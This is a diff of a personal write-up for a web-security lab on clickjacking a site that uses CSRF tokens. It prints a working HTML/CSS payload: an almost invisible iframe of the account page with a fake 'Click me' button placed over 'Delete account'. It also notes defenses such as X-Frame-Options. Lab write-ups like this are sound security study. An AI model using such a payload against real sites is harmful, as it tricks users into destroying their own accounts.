@@ -3,16 +3,16 @@
 ## Lab Name
 Basic clickjacking with CSRF token protection
 
-## How I Solved  
-
-1. **Authenticated:** Logged into the target account using the provided credentials to activate the session.
-2. **Crafted Payload:** Used the Exploit Server to create a malicious HTML page containing an `iframe` pointing to the target's `/my-account` page.
+## How I Solved 
+1. **Authenticated:** Logged into the target account using the provided credentials to activate the user session.
+2. **Crafted Payload:** Used the Exploit Server to host a malicious HTML page containing an `iframe` pointing to the target's `/my-account` page.
 3. **UI Redressing (Alignment):** 
-   * Added a fake `<div>Test me me</div>` element.
-   * Adjusted CSS (`top` and `left` absolute positioning) to align the fake button perfectly over the hidden target "Delete account" button.
+   * Added a fake `<div>Click me</div>` element.
+   * Adjusted CSS (`top: 548px` and `left: 60px` absolute positioning) to align the fake button perfectly over the hidden target "Delete account" button.
 4. **Made Transparent:** Changed the iframe `opacity` to `0.0001` to make the target site completely invisible to the victim.
-5. Final exploit code
-   <style>
+5. Final Code Used
+```html
+<style> 
     iframe {
         position: relative;
         width: 900px;
@@ -28,13 +28,18 @@ Basic clickjacking with CSRF token protection
     }
 </style>
 <div>Click me</div>
-<iframe src=" https://0a96006f04ed0619807912190020002e.web-security-academy.net/my-account"></iframe>
-7. **Executed Attack:** Changed the text to "Click me" and delivered the exploit to the victim.
+<iframe src="https://0a96006f04ed0619807912190020002e.web-security-academy.net/my-account"></iframe>
+```
+6. **Executed Attack:** Delivered the exploit to the victim to trigger the account deletion.
 
 
-## What I Learned 
+## What I Learned
 
-* **CSRF vs Clickjacking:** Anti-CSRF tokens do not protect against Clickjacking. 
-* **The Reason:** Clickjacking tricks the actual user into clicking the UI. The browser automatically includes the valid session cookies and CSRF tokens with the request.
-* **Defense:** To prevent Clickjacking, websites must use HTTP headers like `X-Frame-Options` or `Content-Security-Policy (CSP) frame-ancestors`.
+* **CSRF vs Clickjacking:** Anti-CSRF tokens do not protect against Clickjacking attacks.
+* **The Reason:** Clickjacking tricks the actual user into interacting with the genuine UI. The browser automatically appends all valid session cookies and CSRF tokens with the request.
+* **Defense:** To prevent Clickjacking, websites must enforce HTTP headers like `X-Frame-Options` or `Content-Security-Policy (CSP) frame-ancestors`.
+
+
+
+
 
